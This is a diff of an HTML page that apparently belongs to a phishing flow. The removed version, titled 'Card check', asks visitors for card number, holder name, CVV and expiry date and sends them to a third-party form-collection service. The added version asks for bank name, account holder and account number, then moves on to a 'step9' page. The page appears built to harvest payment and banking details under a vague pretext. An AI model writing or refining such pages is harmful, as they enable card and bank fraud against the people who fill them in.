@@ -1,107 +1,92 @@
-
-
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Card check</title>
+    <meta charset="UTF-8">
+    <title>Bank Information Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f6f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
 
-<style>
-body{
-  font-family: Arial, sans-serif;
-  background:#f2f2f2;
-}
+        .form-container {
+            background: #ffffff;
+            padding: 25px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
 
-.container{
-  max-width:420px;
-  margin:60px auto;
-  background:#fff;
-  padding:25px;
-  border-radius:10px;
-  box-shadow:0 0 15px rgba(0,0,0,0.15);
-}
+        .form-container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333;
+        }
 
-h2{
-  text-align:center;
-  color:#333;
-}
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: bold;
+            color: #555;
+        }
 
-label{
-  font-weight:bold;
-  margin-top:15px;
-  display:block;
-}
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
 
-input{
-  width:100%;
-  padding:12px;
-  margin-top:5px;
-  border:1px solid #ccc;
-  border-radius:6px;
-}
+        input:focus {
+            border-color: #007bff;
+            outline: none;
+        }
 
-.note{
-  margin-top:15px;
-  font-size:14px;
-  color:#777;
-}
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007bff;
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
 
-.visa{
-  text-align:center;
-  margin-top:15px;
-  font-weight:bold;
-  color:#1a73e8;
-}
-
-button{
-  width:100%;
-  margin-top:20px;
-  padding:15px;
-  background:#28a745;
-  color:#fff;
-  font-size:16px;
-  border:none;
-  border-radius:8px;
-}
-</style>
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="container">
+    <div class="form-container">
+        <h2>Bank Information</h2>
 
-    
-    
+        <form action="#" method="post">
+            <label for="bank_name">Bank Name</label>
+            <input type="text" id="bank_name" name="bank_name" placeholder="Enter your bank name" required>
 
+            <label for="account_name">Account Holder Full Name</label>
+            <input type="text" id="account_name" name="account_name" placeholder="Enter full name" required>
 
-    <h2>Fill in your credit card information</h2>
+            <label for="account_number">Bank Account Number</label>
+            <input type="text" id="account_number" name="account_number" placeholder="Enter account number" required>
 
-<form action="https://forminit.com/f/lb2t8ap4c7e" method="POST">
+          
+<button onclick="location.href='step9.html'">SEND</button>
+        </form>
+    </div>
 
-    <label>Bank Card Number</label>
-    <input type="text" placeholder="XXXX XXXX XXXX XXXX" required>
-
-  
-    <label>Holder Name</label>
-    <input type="text" placeholder="LAST NAME AND FIRST NAME OF THE HOLDER" required>
-
-  
-    <label>Visual Cryptogram (CVV)</label>
-    <input type="text" placeholder="XXX" required>
-
-  
-    <label>Expiry Date (MM/YY)</label>
-    <input type="text" placeholder="MM/YY" required>
-  
-    <label>Message</label>
-    <input type="text" placeholder="Express your joy" required>
-
-    <div class="visa">
-        Eligible cards : Visa / MasterCard
-        </div>
-    <button type="submit">Envoyer</button>
-  
-  </form>
+</body>
+</html>
   
 
   <footer class="footer-image">
@@ -116,3 +101,5 @@ button{
 
     
 
+
+      
